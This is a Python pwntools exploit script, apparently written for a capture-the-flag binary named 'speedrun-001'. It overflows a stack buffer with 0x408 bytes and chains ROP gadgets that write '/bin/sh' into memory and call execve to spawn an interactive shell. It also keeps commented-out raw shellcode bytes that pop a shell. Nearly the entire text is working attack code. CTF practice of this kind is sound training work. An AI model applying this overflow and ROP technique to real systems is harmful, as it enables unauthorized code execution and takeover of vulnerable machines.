from pwn import *


context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'

#target = remote("chal1.sieberr.live", 15001)


elf = context.binary = ELF('./speedrun-001')  # local copy
rop = ROP(elf)

target = process()

pid, io_gdb = gdb.attach(target, api=True, gdbscript="c")

# This shellcode is originally from: https://teamrocketist.github.io/2017/09/18/Pwn-CSAW-Pilot/
# However it looks like that site is down now
# This shellcode will pop a shell when we run it
#payload += b"\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05" 
#payload += b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x0f\x05"
# Padding to the return address
#payload += b"0"*(0x28 - len(payload))

# Overwrite the return address with the address of the start of our input

# Send the payload, drop to an interactive shell to use the shell we pop



offset = 0x408
mov_gadget = 0x48d251
pop_rax = rop.find_gadget(['pop rax', 'ret']).address
pop_rdi =  rop.find_gadget(['pop rdi', 'ret']).address
pop_rsi = rop.find_gadget(['pop rsi', 'pop r15', 'ret']).address
pop_rdx = rop.find_gadget(['pop rdx', 'ret']).address

syscall = rop.find_gadget(['syscall', 'ret']).address

'''
pop rax; ret
0x6b6000
pop rdx; ret
"/bin/sh\x00"
mov qword ptr [rax], rdx ; ret

pop rax ; ret
0x3b
pop rdi ; ret
0x6b6000
pop rsi r15 ; ret
0
0
pop rdx ; ret
0
syscall ; ret

'''
payload = flat(
    b"A" * offset,
    pop_rax,
    0x6b6000,  # Address where we will write "/bin/sh"
    pop_rdx,
    b"/bin/sh\x00",  # The string we want to write
    mov_gadget,  # Write the string to the address in rax
    pop_rax,
    0x3b,  # The syscall number for execve
    pop_rdi,
    0x6b6000,  # The address of the string we just wrote
    pop_rsi,
    0,  # rsi = NULL
    0,  # r15 = NULL (not used)
    pop_rdx,
    0,  # rdx = NULL
    syscall  # Make the syscall to execute /bin/sh
)


target.sendafter(b"?\n", payload)


print(pop_rax)
print(pop_rdi)
print(pop_rsi)
print(pop_rdx)
print(syscall)
target.interactive()

